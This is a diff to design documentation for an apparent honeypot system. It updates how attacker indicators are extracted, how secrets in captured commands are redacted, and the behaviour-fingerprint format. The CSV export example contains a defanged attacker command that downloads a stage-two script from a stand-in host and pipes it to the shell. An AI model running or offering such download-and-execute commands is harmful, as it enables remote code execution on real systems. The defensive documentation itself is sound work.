@@ -75,7 +75,7 @@ Channels are the capture channels from [ADR 0005](adr/0005-capture-layer.md) and
 | `file_sha256` | Lower-case SHA-256 hex. | `post_exploit` | `data.sha256` and the `payload_ref` hash on `quarantine` events (#9); `data.sha256` on `filesystem` events; hashes in `hook.implant_refs`. |
 | `cmdline` | A command the attacker ran or tried, after redaction. | `post_exploit` | `hook.cmd_lines[]` (#32); `data.cmdline` or `data.argv` on `process` events. URLs inside also become `url` and `domain` or `ip` IOCs with role `stage2`. |
 | `dns_query` | The exact name the decoy was made to look up. | `callback` | `data.query` or `data.qname` on `dns` events. The same name is also a `domain` IOC, so domain-based exports pick it up. |
-| `behaviour_fingerprint` | `bf1:` plus 32 hex characters. | `behaviour` | The attempt's ordered steps. [Format below](#behaviour-fingerprint-format). |
+| `behaviour_fingerprint` | `bf2:` plus 32 hex characters. | `behaviour` | The attempt's ordered steps. [Format below](#behaviour-fingerprint-format). |
 
 By pipeline:
 
@@ -95,14 +95,16 @@ By pipeline:
 Capture data can hold personal information about people who are not the attacker ([privacy-and-retention.md](privacy-and-retention.md#what-foiled-holds-and-why-it-matters)). Extraction follows the #16 defaults:
 
 - **Bodies stay hashed.** With `store_payloads: false` (the default, and what the API uses today) inline bodies and request slices are never IOC values. Their SHA-256 is a `payload_sha256` IOC instead. Request paths, user agents and protocol commands are access-log data and are extracted either way.
-- **Secrets are removed from text values** (`http_path`, `http_ua`, `request_substring`, `cmdline`, `url`), keeping their shape:
-  - URL passwords: `scheme://user:pw@host` becomes `scheme://user:REDACTED@host`, for any scheme (`http`, `mysql`, `redis`); userinfo without a password (often a token) becomes `REDACTED@host`.
-  - The value after a secret-named key in query strings and config lines (`password=x`, `db_password = x`), JSON (`"Password" : "x"`, any case and spacing) and headers (`X-Api-Key: k1 k2`: the whole value up to the end of the line or the closing quote). A name is secret when it contains, ignoring case, `secret`, `token`, `password`, `passwd`, `api-key`, `api_key`, `apikey`, `private_key`, `privatekey`, `signature`, `session`, `sessid`, `credential`, `cookie` or `jwt` (`X-Amz-Signature`, `apiToken`), when one of its parts (split on `-`, `_` and camel case) is `auth`, `authorization`, `pass`, `pwd`, `sig` or `sid` (`X-Auth-Token`, `basic_auth`, `db_pass`), or when it is exactly `key`.
-  - Not redacted, to keep useful values: names where those letters are part of another word (`author=`, `passport=`), setting words after a secret-named key (`PasswordAuthentication=no`; `yes`, `no`, `true`, `false`, `on`, `off`, `none`, `null`), and `host:port` (a header needs a space after the colon, so `auth-server:8080` stays).
-  - The word after `--password`, `--pass`, `--token`, `--secret`, `--api-key`, `-pass`, `-passin`, `-passout` and `Bearer`, for any program.
-  - The password half of `-u`, `--user`, `--proxy-user` and `-U` values: `curl -u admin:REDACTED`, `smbclient -U admin%REDACTED`.
-  - Password flags of particular programs, found as the first word of each command (after `sudo`, `env` and similar, and inside `sh -c '...'`): `mysql`, `mysqldump`, `mysqladmin`, `mariadb` and `7z` `-pPW` (`-pREDACTED`; a bare `-p` prompts and is kept); `sshpass -p PW` and `-pPW`; `redis-cli -a PW`; `mosquitto_pub` and `mosquitto_sub -P PW`; `zip` and `unzip -P PW`. Other programs keep their flags (`mkdir -p`, `ssh -p 2222`).
-  - Protocol command arguments by position: `AUTH [user] PW` and `LOGIN [user] PW` (the password), `PASS PW`, `HELLO ... AUTH user PW`, `MIGRATE ... AUTH PW` and `... AUTH2 user PW`, `CONFIG SET` values of `requirepass`, `masterauth` and other secret-named parameters, and `ACL SETUSER` password rules (`>PW`, `<PW`, `#hash`, `!hash`). `HELLO 3 AUTH default pw` becomes `HELLO 3 AUTH default REDACTED`. The rules live in `ioc::secret_arg_positions`, which the Redis emulator also uses to mask the same arguments before it logs them, so its events already arrive masked (with hashes in `data.redacted_args`) and extraction still marks those IOCs `redacted`. The same rules also cover any other command: the argument after `AUTH`, `PASS`, `PASSWORD`, `REQUIREPASS`, `MASTERAUTH`, `SECRET`, `TOKEN` or `APIKEY` (two after `AUTH2`), and secret `name=value` arguments.
+- **Secrets are removed from text values** (`http_path`, `http_ua`, `request_substring`, `cmdline`, `url`), keeping their shape. The rules live in `foiled_core::redact` and are pinned by one table test, `crates/core/tests/redaction.rs`, which also runs every case through a frozen copy of the #75 redaction and fails if anything that version hid is shown again (three deliberate exceptions are listed there with reasons).
+  - URL credentials, user and password: `scheme://user:pw@host` and `scheme://TOKEN@host` become `scheme://REDACTED@host`, for any scheme (`http`, `mysql`, `redis`).
+  - The value after a secret-named key: query strings and config lines (`password=x`, `db_password = x`), JSON (`"Password" : "x"`, any case and spacing, escapes honoured) and headers (`name:value` with or without a space: `password:hunter2`, `X-Api-Key: k1 k2`). In text a header value runs to the end of the line or the closing quote; in a command line it ends where the shell ends the word (whitespace, `;`, `|`, `&`, or the closing quote), so `token: x; curl http://...` keeps the `curl`.
+  - A name is secret when it contains, ignoring case, `secret`, `token`, `password`, `passwd`, `pwd`, `api-key`, `api_key`, `apikey`, `private_key`, `privatekey`, `signature`, `session`, `sessid`, `auth`, `credential`, `cookie` or `jwt` (`authkey`, `dbpwd`, `Authentication`, `X-Amz-Signature`, `apiToken`), when one of its parts (split on `-`, `_` and camel case) is `pass`, `sig` or `sid` (`db_pass`), or when it is exactly `pass`, `key`, `sig` or `sid`.
+  - Kept on purpose: `author` (the one place `auth` is not a secret: `?author=bob`), setting words after a secret-named key (`PasswordAuthentication=no`; `yes`, `no`, `true`, `false`, `on`, `off`, `none`, `null`), and `host:port` where the name only mentions a secret and its last part is not one (`auth-server:8080/x` stays, `token:12345` and `db-pass:1234` do not).
+  - Command lines are split into commands on `;`, `&&`, `||`, `|`, `&` and newlines, with shell quoting honoured. Each command finds its program after `VAR=value` assignments and wrappers with their options (`sudo -u root`, `env -i X=1`, `timeout -s KILL 5`, `nice -n 5`, `nohup`, `stdbuf`, `time`, `xargs`, `exec`, `command`), and `sh -c '...'` strings (also `bash -lc`) are redacted as command lines of their own.
+  - The whole word after `--password`, `--pass`, `--token`, `--secret`, `--api-key`, `-pass`, `-passin`, `-passout` and `Bearer`, quotes included: `--password 'my secret'` becomes `--password 'REDACTED'`.
+  - The password half of user and password pairs, separate or attached: `curl -u admin:REDACTED`, `-uadmin:REDACTED`, `--user=admin:REDACTED`, `smbclient -U admin%REDACTED`.
+  - Program password flags: `mysql`, `mysqldump`, `mysqladmin`, `mariadb` and `7z` `-pPW` (`-pREDACTED`, quoted or not; a bare `-p` prompts and is kept); `sshpass -p PW` and `-pPW`; `redis-cli -a PW`; `mosquitto_pub` and `mosquitto_sub -P PW`; `zip` and `unzip -P PW`. Other programs keep their flags (`mkdir -p`, `ssh -p 2222`).
+  - Protocol command arguments by position (`redact::secret_arg_positions`): every argument of `AUTH`, `LOGIN` and `PASS` (user names too, as in #75); user and password after `HELLO ... AUTH`; the password after `MIGRATE ... AUTH` and user and password after `AUTH2`; `CONFIG SET` values of `requirepass`, `masterauth` and other secret-named parameters; `ACL SETUSER` password rules (`>PW`, `<PW`, `#hash`, `!hash`); and in any other command (`SENTINEL SET m auth-pass PW`, unknown commands) the argument after `AUTH`, `PASS`, `PASSWORD`, `REQUIREPASS`, `MASTERAUTH`, `SECRET`, `TOKEN`, `APIKEY` or any secret-named word (two after `AUTH2`), and secret `name=value` arguments. When the arity is short the rule fails closed and hides everything after the keyword: `HELLO 3 AUTH pw` becomes `HELLO 3 AUTH REDACTED`. The Redis emulator masks the same positions before it logs, so its events arrive masked (hashes in `data.redacted_args`) and extraction still marks those IOCs `redacted`.
 - **Email local parts are removed**, plain or URL-encoded: `ops@example.invalid` becomes `REDACTED@example.invalid` and `ops%40example.invalid` becomes `REDACTED%40example.invalid`.
 - `redacted: true` marks every IOC whose value was changed, so exports know it is not byte-exact. The id is computed over the redacted value, so it is still stable.
 - **Canaries are never IOCs.** Any value containing a canary prefix (`vt-canary-`, `vt_canary_`, `VTCANARY`, `vtcanary`), the planted database host or the `canary_id` of the event is skipped. They are Foiled's own secrets, and contribute-back must never publish them ([contribute-back.md](contribute-back.md#what-a-released-ioc-contains)).
@@ -144,10 +146,10 @@ The API asks the store for cached Facts (`Store::enrichment_facts`) for the addr
 
 A behaviour fingerprint is a stable id for "what the attacker did", independent of where from. It is the IOC that still works when there is no file to hash ([glossary](glossary.md)).
 
-**Value:** `bf1:` followed by the first 16 bytes, in lower-case hex, of
+**Value:** `bf2:` followed by the first 16 bytes, in lower-case hex, of
 
 ```text
-SHA-256( "foiled-behaviour-fingerprint/v1" + "\n" + join("\n", steps) )
+SHA-256( "foiled-behaviour-fingerprint/v2" + "\n" + join("\n", steps) )
 ```
 
 **Steps.** Each event in the attempt gives zero or more normalised steps. Volatile and attacker-chosen values (addresses, host names, query values, arguments, passwords, keys, file names, ports) are left out, so the same tool gives the same steps from anywhere and no secret or canary can reach a fingerprint.
@@ -175,9 +177,9 @@ SHA-256( "foiled-behaviour-fingerprint/v1" + "\n" + join("\n", steps) )
 ```json
 {
   "type": "behaviour_fingerprint",
-  "value": "bf1:e5d2f5a92afd8930cbf7518a4983d112",
+  "value": "bf2:07d7fffe3024f68dcedc50ae3405fd39",
   "fingerprint": {
-    "version": 1,
+    "version": 2,
     "steps": [
       "http GET /admin",
       "http POST /api/upload?path&token",
@@ -192,7 +194,14 @@ SHA-256( "foiled-behaviour-fingerprint/v1" + "\n" + join("\n", steps) )
 }
 ```
 
-**Versioning.** Any change to the step grammar, normalisation or hash input is a new version (`bf2:`) and a new `FINGERPRINT_VERSION`. Old fingerprints are never recomputed under a new version silently; both can be emitted side by side while consumers move.
+**Versioning.** Any change to the step grammar, normalisation or hash input is a new version and a new `FINGERPRINT_VERSION`, with the version in the prefix and in `fingerprint.version`.
+
+| Version | Since | What it hashes |
+| --- | --- | --- |
+| `bf1` | #75 | Path shapes with digit runs folded to `0`; protocol commands with their first argument for subcommand commands, read from `data.args` only. |
+| `bf2` | #77 | Path segments that hold digits, look random or follow an account segment become `*`; protocol commands take `data.subcommand` when the emulator logs it apart; attacker words are length and character checked. Domain string `foiled-behaviour-fingerprint/v2`. |
+
+Foiled computes only the current version. Values of different versions are never compared: a `bf1` and a `bf2` for the same behaviour differ, and equal steps under different versions say nothing. Because IOCs are recomputed from live events on every request, nothing Foiled serves still carries `bf1`. Anything that stored `bf1` values elsewhere (an export, a campaign table, a notebook) must treat them as a separate, retired namespace: campaigns (#33) and correlation cluster within one version only, and re-derive from events rather than map `bf1` to `bf2`.
 
 **Limits.** Timing jitter between attacker-facing and guest-side events can reorder steps across runs of the same tool, giving different fingerprints. Campaign clustering (#33) should compare `fingerprint.steps` for near matches rather than rely on exact ids alone. #12 sequences are hand-written rules; fingerprints are computed and need no rule.
 
@@ -241,13 +250,13 @@ CSV, one row per IOC with the limitation spelt out:
 ```text
 indicator_type,indicator,first_seen,last_seen,file_ioc_limited,note
 cmdline,sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh',2026-10-18T01:02:04Z,2026-10-18T01:02:04Z,true,memory-resident implant: no file hash available
-behaviour_fingerprint,bf1:e5d2f5a92afd8930cbf7518a4983d112,2026-10-18T01:02:03Z,2026-10-18T01:02:10Z,true,memory-resident implant: no file hash available
+behaviour_fingerprint,bf2:07d7fffe3024f68dcedc50ae3405fd39,2026-10-18T01:02:03Z,2026-10-18T01:02:10Z,true,memory-resident implant: no file hash available
 url,hxxp://stage2[.]example[.]invalid/m.sh,2026-10-18T01:02:04Z,2026-10-18T01:02:05Z,true,memory-resident implant: no file hash available
 ```
 
 STIX 2.1 (sketch for #13): network and command-line IOCs become `indicator` objects with patterns (`[url:value = '...']`, `[domain-name:value = '...']`, `[process:command_line = '...']`). The behaviour fingerprint has no STIX observable type, so it becomes an `indicator` with `pattern_type: "foiled-bf"` and the steps in `description`, plus an `x_foiled_file_ioc_limited: true` property. No `file` SCO and no `[file:hashes...]` pattern is emitted. A `note` object on the bundle carries the attempt note above.
 
-MISP (sketch for #13): attributes `ip-dst`, `domain`, `url`, `user-agent`, `text` (command line, category "Payload installation"), and `text` with comment "foiled behaviour fingerprint" for `bf1:` values. The event gets the tag `foiled:file-ioc-limited` and the attempt note as an event comment. No `sha256` or `filename|sha256` attribute.
+MISP (sketch for #13): attributes `ip-dst`, `domain`, `url`, `user-agent`, `text` (command line, category "Payload installation"), and `text` with comment "foiled behaviour fingerprint" for `bf2:` values. The event gets the tag `foiled:file-ioc-limited` and the attempt note as an event comment. No `sha256` or `filename|sha256` attribute.
 
 ## Confidence
 
